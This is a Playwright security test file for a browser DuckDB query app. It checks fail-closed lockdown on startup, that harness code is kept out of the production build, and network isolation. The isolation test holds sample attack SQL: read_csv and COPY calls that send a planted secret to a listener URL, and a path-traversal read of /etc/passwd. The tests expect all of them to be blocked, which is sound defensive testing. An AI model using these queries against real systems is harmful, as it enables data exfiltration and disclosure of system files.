// Finding 1 (fail-closed startup, test-only bypass) and network-isolation evidence.
import { expect, test } from '@playwright/test';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { APP, captureRequests, HARNESS, openApp, openHarness, run, startListener } from './helpers';

const ROOT = join(import.meta.dirname, '..', '..');

function filesUnder(dir: string): string[] {
  return readdirSync(dir).flatMap((f) => {
    const p = join(dir, f);
    return statSync(p).isDirectory() ? filesUnder(p) : [p];
  });
}

// ---------------------------------------------------------------- production artifact

test('production artifact contains no negative-control or harness code', () => {
  const markers = ['__qvHarness', 'rawUnlockedQuery', 'TEST HARNESS', 'lockdown=off', 'get("lockdown")', "get('lockdown')", 'harnessReady'];
  const prod = filesUnder(join(ROOT, 'dist')).filter((f) => /\.(js|html|css)$/.test(f));
  expect(prod.length).toBeGreaterThan(2);
  const hits = prod.flatMap((f) => markers.filter((m) => readFileSync(f, 'utf8').includes(m)).map((m) => `${f}: ${m}`));
  expect(hits).toEqual([]);
  // Sanity check that the scan would find the markers: the harness artifact contains them.
  const harness = filesUnder(join(ROOT, 'dist-harness')).filter((f) => /\.(js|html)$/.test(f)).map((f) => readFileSync(f, 'utf8')).join('\n');
  expect(harness).toContain('__qvHarness');
  expect(harness).toContain('rawUnlockedQuery');
  expect(filesUnder(join(ROOT, 'dist')).some((f) => f.includes('harness'))).toBe(false);
});

test('a ?lockdown=off URL has no effect on the production build', async ({ page }) => {
  await page.goto(`${APP}?lockdown=off`);
  const info = await page.evaluate(() => window.__qv!.ready);
  expect(info.lockdownVerified).toBe(true);
  const r = await run(page, "SELECT current_setting('enable_external_access')::VARCHAR, current_setting('lock_configuration')::VARCHAR");
  expect(r.status === 'ok' && r.result.rows[0]).toEqual(['false', 'true']);
});

// ---------------------------------------------------------------- fail-closed startup (harness)

const faults: [string, string][] = [
  ['lock statement fails (Codex repro)', 'fail:SET lock_configuration = true'],
  ['lock statement omitted', 'omit:SET lock_configuration = true'],
  ['external access statement omitted', 'omit:SET enable_external_access = false'],
  ['autoload statement omitted', 'omit:SET autoload_known_extensions = false'],
  ['allowed_directories statement omitted', 'omit:allowed_directories'],
  ['json extension not loaded', 'omit:LOAD json'],
  ['extension repository statement fails', 'fail:custom_extension_repository'],
];

for (const [name, spec] of faults) {
  test(`fail-closed: ${name} → start() rejects, no SQL, no files, worker terminated`, async ({ page }) => {
    await openHarness(page);
    const baselineWorkers = page.workers().length;
    const out = await page.evaluate(async (spec) => {
      const H = window.__qvHarness!;
      const [kind, needle] = [spec.slice(0, spec.indexOf(':')), spec.slice(spec.indexOf(':') + 1)];
      const plan = (repo: string) =>
        H.lockdownStatements(repo).flatMap((s) => (s.includes(needle) ? (kind === 'omit' ? [] : [`${s} THIS_IS_INJECTED_INVALID_SQL`]) : [s]));
      const s = new H.EngineSession({ memoryLimit: null, cancelDeadlineMs: 1000, lockdownPlan: plan });
      let startError = '';
      try {
        await s.start();
      } catch (e) {
        startError = String(e);
      }
      const q = await s.run('SELECT 1');
      const reg = await s.registerFile(new File(['a\n1\n'], 'x.csv')).then(() => 'registered', (e: unknown) => String(e));
      return { startError, state: s.state, info: s.info, query: q.status === 'error' ? q.error : q.status, reg };
    }, spec);
    expect(out.startError).toMatch(/LockdownError|security control/i);
    expect(out.state).toBe('failed');
    expect(out.info).toBeNull();
    expect(out.query).toMatch(/not ready/);
    expect(out.reg).toMatch(/not ready/);
    await expect.poll(() => page.workers().length).toBe(baselineWorkers);
  });
}

test('recovery re-applies and re-verifies the lockdown; a failure during recovery fails closed', async ({ page }) => {
  await openHarness(page);
  const out = await page.evaluate(async () => {
    const H = window.__qvHarness!;
    let boots = 0;
    // First boot uses the real plan; later boots drop the lock statement.
    const plan = (repo: string) => (++boots === 1 ? H.lockdownStatements(repo) : H.lockdownStatements(repo).filter((s) => !s.includes('lock_configuration')));
    const s = new H.EngineSession({ memoryLimit: null, cancelDeadlineMs: 1000, lockdownPlan: plan });
    await s.start();
    const good = new H.EngineSession({ memoryLimit: null, cancelDeadlineMs: 1000 });
    await good.start();
    await good.restart('test');
    const goodInfo = good.info!;
    const goodLock = await good.run('SET lock_configuration = false');
    await good.dispose();
    let recoveryError = '';
    await s.restart('test').catch((e: unknown) => (recoveryError = String(e)));
    const after = await s.run('SELECT 1');
    return { goodGen: goodInfo.generation, goodVerified: goodInfo.verification.ok, goodLock: goodLock.status, recoveryError, state: s.state, after: after.status === 'error' ? after.error : after.status };
  });
  expect(out.goodGen).toBe(2);
  expect(out.goodVerified).toBe(true);
  expect(out.goodLock).toBe('error');
  expect(out.recoveryError).toMatch(/not in effect|lock_configuration/);
  expect(out.state).toBe('failed');
  expect(out.after).toMatch(/not ready/);
});

// ---------------------------------------------------------------- network isolation (production artifact)

test('production artifact: lockdown blocks escalations; every request is a same-origin static GET with no data', async ({ page, context }) => {
  const listener = await startListener();
  const requests = await captureRequests(context);
  const responses: { url: string; status: number; redirected: boolean }[] = [];
  context.on('response', (r) => responses.push({ url: r.url(), status: r.status(), redirected: r.request().redirectedFrom() !== null }));
  try {
    await openApp(page);
    const canary = `CANARY${Math.random().toString(36).slice(2)}`;
    await page.evaluate((c) => window.__qv!.registerText('secret.csv', `id,secret\n1,${c}\n2,${c}2\n`), canary);
    const own = await run(page, `SELECT count(*) FROM secret WHERE secret LIKE 'CANARY%'`);
    expect(own.status === 'ok' && own.result.rows).toEqual([['2']]);

    const probes = await page.evaluate((t) => window.__qv!.session.probeEscalations(t), listener.url);
    expect(probes.filter((p) => !p.blocked && !p.mayReturnWithoutEffect)).toEqual([]);
    test.info().annotations.push({ type: 'probes', description: JSON.stringify(probes.map((p) => `${p.blocked ? 'BLOCKED' : 'RETURNED'}: ${p.name}`)) });
    for (const sql of [
      `SELECT * FROM read_csv('${listener.url}/x?d=' || (SELECT secret FROM secret LIMIT 1))`,
      `COPY (SELECT * FROM secret) TO '${listener.url}/out.csv'`,
      `SELECT * FROM read_csv('/qv-local/../../etc/passwd')`,
    ]) {
      const r = await run(page, sql);
      expect(r.status, sql).toBe('error');
    }
    const loaded = await run(page, 'SELECT extension_name FROM duckdb_extensions() WHERE loaded ORDER BY 1');
    expect(loaded.status === 'ok' && loaded.result.rows.map((r) => r[0])).toEqual(['core_functions', 'json', 'parquet']);
    expect((await run(page, 'SELECT count(*) FROM secret')).status).toBe('ok');

    expect(listener.hits).toEqual([]);
    const allowed = /^\/queryverdict\/(|assets\/[\w.-]+\.(js|css|wasm)|duckdb-ext\/v1\.5\.4\/wasm_(eh|mvp)\/(parquet|json)\.duckdb_extension\.wasm)$/;
    for (const r of requests) {
      const u = new URL(r.url());
      expect(u.origin, r.url()).toBe('http://127.0.0.1:4173');
      expect(u.pathname, r.url()).toMatch(allowed);
      expect(u.search, r.url()).toBe('');
      expect(r.method(), r.url()).toBe('GET');
      expect(r.postData(), r.url()).toBeNull();
      const headers = JSON.stringify(await r.allHeaders());
      expect(headers).not.toContain(canary);
    }
    expect(responses.filter((r) => r.redirected || (r.status >= 300 && r.status < 400))).toEqual([]);
  } finally {
    await listener.close();
  }
});

// ---------------------------------------------------------------- positive controls (harness only)

test('positive controls: capture sees page and worker traffic; meta CSP blocks page fetches but not the worker', async ({ page, context }) => {
  const listener = await startListener();
  const requests = await captureRequests(context);
  try {
    await openHarness(page);
    const canary = `PROBE${Math.random().toString(36).slice(2)}`;
    // (a) page traffic, same origin, with data in the query string: must be captured.
    const same = await page.evaluate((c) => window.__qvHarness!.pageFetch(`/queryverdict/__probe?c=${c}`), canary);
    expect(same.status).not.toBeNull(); // vite preview answers unknown paths with the SPA page (200)
    expect(requests.some((r) => r.url().includes(canary))).toBe(true);
    // (b) page traffic to another origin: the meta CSP (connect-src 'self') blocks it.
    const cross = await page.evaluate((u) => window.__qvHarness!.pageFetch(`${u}/page-fetch`), listener.url);
    expect(cross.ok).toBe(false);
    expect(listener.hits.filter((h) => h.url === '/page-fetch')).toEqual([]);
    // (c) worker traffic from an UNLOCKED engine (negative control): reaches the listener despite the
    //     meta CSP, and the capture method sees it.
    const raw = await page.evaluate((u) => window.__qvHarness!.rawUnlockedQuery(`SELECT * FROM read_csv('${u}/worker-probe.csv')`), listener.url);
    expect(raw.ok).toBe(false); // listener answers 404
    expect(listener.hits.some((h) => h.url === '/worker-probe.csv')).toBe(true);
    expect(requests.some((r) => r.url() === `${listener.url}/worker-probe.csv`)).toBe(true);
  } finally {
    await listener.close();
  }
});

test('harness page is only reachable on the harness server', async ({ request }) => {
  expect((await request.get(HARNESS)).status()).toBe(200);
  const prod = await request.get(`${APP}harness/`);
  // vite preview falls back to index.html for unknown paths; it must not serve the harness.
  expect(await prod.text()).not.toContain('TEST HARNESS');
});
